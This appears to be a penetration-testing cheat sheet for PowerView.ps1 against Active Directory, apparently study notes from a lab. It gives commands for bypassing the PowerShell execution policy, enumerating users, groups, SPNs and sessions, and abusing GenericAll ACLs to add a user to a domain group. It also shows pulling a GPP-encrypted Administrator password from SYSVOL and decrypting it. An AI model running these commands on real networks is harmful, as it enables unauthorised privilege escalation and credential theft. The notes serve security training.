# Using PowerView
`PowerView.ps1` is a powerful PowerShell script included in the PowerSploit framework, designed for Active Directory enumeration and exploitation. Below is an overview of commonly used commands and examples for `PowerView.ps1`.
**Importing PowerView**
```powershell
powershell -ep bypass
Import-Module .\PowerView.ps1
```
## Enumerating Domain Information
**Get-NetDomain**
```powershell
Get-NetDomain
```
**Get-NetForest**
```powershell
Get-NetForest
```
**Get-NetDomainController**
```powershell
Get-NetDomainController
```
**Get-NetUser**
List **all users** in the domain:
```powershell
Get-NetUser
```
- **To filter by a specific user:**
```powershell
Get-NetUser | Where-Object { $_.SamAccountName -eq "gamal" }
```
- **Querying users using select statement**
``` powershell
Get-NetUser | select cn
```
- **Querying users displaying pwdlastset and lastlogon**
``` powershell
Get-NetUser | select cn,pwdlastset,lastlogon
```
- Example 
``` powershell
Get-DomainUser -Identity gamal -Domain domain.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```
**Get-NetGroup**
**Retrieve all groups in the domain**
```powershell
Get-NetGroup
```
- **Find users in a specific group**
```powershell
Get-NetGroup | Where-Object { $_.Name -eq "Development Department" }
```
- **Enumerate a specific group member**
``` powershell
Get-NetGroup "Management Department" | select member
```
- **Recursive Group Membership**
``` powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
- **enumerate domain trust mappings**
``` powershell
Get-DomainTrustMapping
```
- We can use the [Test-AdminAccess](https://powersploit.readthedocs.io/en/latest/Recon/Test-AdminAccess/) function to test for local admin access on either the current machine or a remote one.
- test if a user has administrative access to a local or remote host
``` powershell
Test-AdminAccess -ComputerName Comp-EA-MS01
```
## Enumerating Computers
**List all computers in the domain:**
```powershell
Get-NetComputer
```
**Displaying OS and hostname**
``` powershell
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```
**Filter by operating system:**
```powershell
Get-NetComputer -OperatingSystem "Windows Server*"
```
**Find-LocalAdminAccess**
- Scans the network in an attempt to determine if our current user has **administrative permissions** on any computers in the domain.:
```powershell
Find-LocalAdminAccess
```
## Enumeration Through Service Principal Names
- **Listing the SPN accounts in the domain**
``` powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
- To enumerate SPNs in the domain, we have multiple options. In this case, we'll use setspn.exe, which is installed on Windows by default. We'll use -L to run against both servers and clients in the domain. 
- **Finding Users With SPN Set**
``` powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

**Listing SPN linked to a certain user account** 
``` powershell
setspn -L iis_service
```
![image](https://github.com/user-attachments/assets/368e7933-3e93-441f-83aa-7d03c8b7dba0)
## Enumerating **Object Permissions**
Here's a list of the most interesting
**GenericAll**: Full permissions on object
**GenericWrite**: Edit certain attributes on the object
**WriteOwner**: Change ownership of the object
**WriteDACL**: Edit ACE's applied to object
**AllExtendedRights**: Change password, reset password, etc.
**ForceChangePassword**: Password change for object
**Self (Self-Membership)**: Add ourselves to for example a group
The [Microsoft documentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks) lists other permissions and describes each in more detail.
#### Enumerate ACEs with PowerView
``` powershell
Get-ObjectAcl -Identity stephanie
```
we are primarily interested in those **highlighted**
![Pasted image 20241224120822](https://github.com/user-attachments/assets/6560a072-a667-4657-ba20-fd4545f3eba2)

``` powershell
Get-ObjectAcl -Identity UserName | select ObjectSID,ActiveDirectoryRights,SecurityIdentifier
```
The output lists two [_Security Identifiers_](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) (SID), unique values that represent an object in AD.
#### Converting the ObjectISD into name
``` powershell
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```
#### Enumerate all objects the domain
generate clean and manageable output
``` powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
Converting all SIDs that have GenericAll permission on the Management Group
``` powershell
"SID01","SID02","SID03","SID04" | Convert-SidToName
```
Using "net.exe" to add ourselves to domain group if you got ACL permisson
``` powershell
net group "Management Department" stephanie /add /domain
```
## Domain Share Query List shared folders across the network:
``` powershell
Find-DomainShare
```
Or we can use
```powershell
Invoke-ShareFinder
```

![Pasted image 20241224143305](https://github.com/user-attachments/assets/ed627a2b-3b84-4077-b473-e9b5a3b0d783)

 [**SYSVOL**](https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx), as it may include files and folders that reside on the domain controller itself.
 ``` powershell
 ls \\dc1.corp.com\sysvol\corp.com\
```
- Investigate every folder
``` powershell
ls \\dc1.corp.com\sysvol\corp.com\Policies\
```
![Pasted image 20241224143757](https://github.com/user-attachments/assets/54a58560-494d-46c8-9ad3-843e0ae00bd4)

Checking contents of old-policy-backup.xml file
``` powershell
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```
![Pasted image 20241224144802](https://github.com/user-attachments/assets/24c1ee97-4bbc-4ad6-98b9-9490a1bf1b68)

XML file describes an old policy (helpful for learning more about the current policies) and an encrypted password for the local built-in Administrator account. The encrypted password could be extremely valuable for us.
system administrators often changed local workstation passwords through [_Group Policy Preferences_](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v=ws.11)) (GPP).
However, even though GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on [_MSDN_](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN#endNote2). We can use this key to decrypt these encrypted passwords. In this case, we'll use the [**gpp-decrypt**](https://www.kali.org/tools/gpp-decrypt/) ruby script in Kali Linux that decrypts a given GPP encrypted string:
``` bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```
## **Invoke-FileFinder**

Search for specific files across shared folders:

```powershell
Invoke-FileFinder -Include "passwords*.txt"
```
## **Get-NetGPO**

Retrieve all GPOs in the domain:

```powershell
Get-NetGPO
```

## **Get-NetGPOGroup**

Find GPOs linked to specific groups:

```powershell
Get-NetGPOGroup
```
## **Get-NetSession**

List active sessions on domain computers:

```powershell
Get-NetSession
```

## **Get-NetLoggedon**

Find users currently logged on to domain computers:

```powershell
Get-NetLoggedon
```


